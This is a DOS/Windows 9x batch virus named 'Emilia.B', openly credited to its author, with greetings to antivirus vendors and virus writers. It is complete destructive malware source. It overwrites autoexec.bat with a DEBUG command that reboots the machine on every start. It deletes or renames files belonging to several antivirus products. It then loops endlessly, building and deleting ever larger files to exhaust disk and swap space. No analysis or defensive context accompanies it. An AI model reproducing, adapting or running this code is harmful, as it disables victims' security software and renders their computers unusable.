   @echo Project - EmiliA
   @echo Creator - DVL
   @echo VirName - Emilia.B
   @echo Purpose - Created just 2 demonstrate that .bat virii r pretty
   @echo           cool, crypted or not, BATch language is not lame.
   @echo GreetZ  - AV - Kaspersky, F-Prot, BitDefender
   @echo           VX - SpTh, Ratty, _Adder_, Gotenks, NGL
   @echo           and ALL BATch virus creators.
   @echo Contact - dvl2003ro@yahoo.co.uk
   :: 3
   :: 2
   :: 1
   :: Virus is starting ...
   @echo off
   :: Rewriting c:\autoexec.bat, only to loop restart forever.
   echo"ECHO G=FFFF:0 | C:\WINDOWS\COMMAND\DEBUG.EXE >NUL" >c:\autoexec.bat
   :: Deleting some IMPORTANT AV files. :)
   @ren c:\progra~1\common~1\avpsha~1\avpbases\*.avc *.avp >nul
   @deltree/y c:\progra~1\norton~1\s32integ.dll >nul
   @deltree/y c:\progra~1\f-prot95\fpwm32.dll >nul
   @deltree/y c:\progra~1\mcafee\scan.dat >nul
   @deltree/y c:\progra~1\tbav\tbav.dat >nul
   @deltree/y c:\tbavw95\tbscan.sig >nul
   @deltree/y c:\tbav\tbav.dat >nul
   :: Creating BIG files and deleting them ... :) Windows doesn't not react so GOOD.
   :: Believe me,I've tried this one on my computer.Enjoy the windows win386.swp looping :)
   :loop
   @echo Project Emilia Project Emilia Project Emilia Project Emilia Project Emilia Project Emilia Project Emilia Project Emilia >> dvl1.txt
   @echo Project Emilia Project Emilia Project Emilia Project Emilia Project Emilia Project Emilia Project Emilia Project Emilia >> dvl2.txt
   @echo Project Emilia Project Emilia Project Emilia Project Emilia Project Emilia Project Emilia Project Emilia Project Emilia >> dvl3.txt
   @copy dvl1.txt+dvl2.txt dvl1.txt
   @copy dvl2.txt+dvl3.txt dvl2.txt
   @copy dvl3.txt+dvl1.txt dvl3.txt
   @copy dvl1.txt+dvl2.txt dvl1.txt
   @copy dvl2.txt+dvl3.txt dvl2.txt
   @copy dvl3.txt+dvl1.txt dvl3.txt
   @copy dvl1.txt+dvl2.txt dvl1.txt
   @copy dvl2.txt+dvl3.txt dvl2.txt
   @copy dvl3.txt+dvl1.txt dvl3.txt
   @deltree/y dvl1.txt >nul
   @deltree/y dvl2.txt >nul
   @deltree/y dvl3.txt >nul
   goto loop
